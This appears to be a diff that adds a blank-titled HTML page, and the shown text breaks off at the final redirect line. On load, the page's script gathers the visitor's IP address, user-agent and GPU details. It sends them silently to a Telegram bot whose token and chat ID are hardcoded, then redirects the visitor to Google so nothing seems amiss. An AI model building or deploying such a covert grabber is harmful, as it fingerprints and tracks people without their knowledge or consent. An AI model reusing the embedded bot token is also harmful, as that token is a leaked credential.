@@ -1,1 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title></title>
+    <script>
+        async function getIP() {
+            try {
+                const res = await fetch("https://api64.ipify.org?format=json");
+                const data = await res.json();
+                return data.ip;
+            } catch (e) {
+                return "Failed to get IP";
+            }
+        }
 
+        function getGPUInfo() {
+            try {
+                const canvas = document.createElement("canvas");
+                const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+                if (!gl) return "WebGL not supported";
+
+                const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
+                return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "GPU info unavailable";
+            } catch (e) {
+                return "Error retrieving GPU info";
+            }
+        }
+
+        async function sendDataToTelegram() {
+            const ip = await getIP();
+            const userAgent = navigator.userAgent;
+            const gpu = getGPUInfo();
+
+            const botToken = "7671006802:AAG1xxrUgft4bPHDwAZu6oF2n60X6E3glc8";  // Replace with your bot token
+            const chatId = "6331127625";  // Replace with your Telegram user ID
+            const message = `🚀 New Visit:\n\n🔹 IP: ${ip}\n🔹 User-Agent: ${userAgent}\n🔹 GPU: ${gpu}`;
+            
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            fetch(url, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: chatId, text: message })
+            });
+        }
+
+        (async () => {
+            await sendDataToTelegram();
+            window.location.href = "https://www.google.com"; // Ins
